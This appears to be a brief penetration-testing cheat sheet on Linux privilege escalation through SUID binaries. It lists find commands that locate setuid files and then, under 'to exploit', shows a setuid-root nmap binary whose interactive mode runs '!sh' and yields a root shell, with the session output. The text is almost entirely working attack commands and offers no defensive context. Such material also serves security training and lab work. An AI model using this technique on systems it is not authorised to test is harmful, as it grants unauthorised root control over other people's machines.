**suid** on binary

```bash
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
```
```bash
find / -type f -perm -4001 -exec ls -lah {} \; 2> /dev/null
```

#### nmap 
```
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
```
- **to exploit**
```bash
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
root
waiting to reap child : No child processes
nmap> !sh
# id
```
